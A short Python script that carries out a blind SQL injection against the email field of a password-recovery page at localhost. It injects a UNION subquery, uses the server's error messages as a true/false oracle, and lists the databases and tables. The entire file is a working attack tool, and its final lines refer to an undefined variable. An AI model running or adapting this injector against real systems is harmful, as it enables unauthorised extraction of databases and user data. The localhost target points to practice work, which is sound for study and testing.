#!/usr/bin/env python3
from sqlinj.injection import BaseInjector
import urllib, urllib.request
from time import sleep

INJECTION_URL = "http://localhost/recover_password.php"
POST_DATA = {'email' : '{query}'}

class WebInjector(BaseInjector):

    def __init__(self, url, post_data):
        super().__init__()
        self.url = url
        self.post_data = post_data

    def isSuccessfulResponse(self, resp):
        return str(resp).find('Error: subquery returns more than 1 row') >= 0

    def isFailureResponse(self, resp):
        return str(resp).find('The given email does not exist') >= 0

    def runQuery(self, query):
        sql = """' AND 1 = (SELECT 0 FROM dual UNION {query}) AND 1 = '1""".format(query=query)

        data = {}
        for key in self.post_data.keys():
            data[key] = POST_DATA[key].format(query=sql)

        resp = urllib.request.urlopen(self.url, data=urllib.parse.urlencode(data).encode('UTF-8'))
        sleep(0.1)

        resp = resp.read()
        if self.isSuccessfulResponse(resp):
            return True
        elif self.isFailureResponse(resp):
            return False
        else:
            raise Exception("Unexpected response from server: {0}".format(resp))


if __name__ == '__main__':
    injector = WebInjector(INJECTION_URL, POST_DATA)

    databases = injector.getDatabases()
    print(databases)
    tables = injector.getTables(database)
    print(tables)